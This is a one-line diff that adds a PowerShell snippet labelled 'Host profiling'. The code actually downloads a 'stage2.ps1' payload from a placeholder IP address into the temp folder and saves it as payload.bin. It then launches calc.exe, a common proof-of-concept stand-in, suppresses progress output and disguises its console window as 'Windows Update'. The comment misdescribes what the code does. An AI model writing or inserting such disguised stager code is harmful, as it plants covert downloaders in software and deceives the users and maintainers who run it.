@@ -1,0 +1,1 @@
+<# Host profiling #> $FetchUrl = 'https://192.0.2.90/stage2.ps1'; $WorkingPath = "$env:TEMP\payload.bin"; (New-Object System.Net.WebClient).DownloadFile($FetchUrl, $WorkingPath); & 'calc.exe'; $ProgressPreference = "SilentlyContinue"; $Host.UI.RawUI.WindowTitle = "Windows Update"
